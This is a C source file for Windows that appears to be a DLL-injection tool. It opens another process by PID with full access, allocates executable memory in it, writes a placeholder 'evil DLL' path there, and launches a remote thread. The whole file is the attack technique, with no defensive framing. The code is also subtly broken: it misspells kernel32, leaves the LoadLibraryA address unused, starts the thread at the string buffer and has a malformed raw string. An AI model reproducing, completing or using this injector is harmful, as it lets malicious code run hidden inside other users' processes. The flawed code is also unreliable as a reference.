#include <windows.h>
#include <stdio.h>

const char* g = "[+]";
const char* b = "[-]";
const char* i = "[*]";
DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID BUFFER = NULL;
HMODULE hKernel32 = NULL;
VOID* lb = NULL;
char evilDLL[] = R"REPLACE THIS WITH THE PATH TO YOUR EVIL DLL FILE";
unsigned int evillen = sizeof(evilDLL) + 1;
int main(int argc, char* argv[]) {
	if (argc != 2) {

		printf("%s Usage: %s <PID>\n", i, argv[0]);
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);

	// Getting the Handle to Kernal32 and passing it to Lb
	hKernel32 = GetModuleHandleA("Kernal32");
	lb = GetProcAddress(hKernel32, "LoadLibraryA");

	// Getting the Handle to the Process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("%s Couldn't get handle to the process, error: %ld\n", b, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s Obtained handle for the process\n\\---0x%p\n", g, hProcess);

	// Allocating Memory for Injection

BUFFER = VirtualAllocEx(hProcess, NULL, evillen , (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	printf("%s Successfully allocated %zu-bytes of memory for injection\n", g, evillen);

	//Writing Process Memory
	if (!WriteProcessMemory(hProcess, BUFFER, evilDLL, evillen, NULL)) {
		printf("%s Couldn't write DLL to allocated memory, error: %ld", b, GetLastError());
		return EXIT_FAILURE;
	}
	printf("%s Successfully wrote DLL to process memory\n", g);

	// Creating Thread to Run Payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)BUFFER, NULL, 0, 0, &TID);
	printf("%s Successfully ran thread with TID: %ul, goodbye!", g, TID);
	return EXIT_SUCCESS;
}
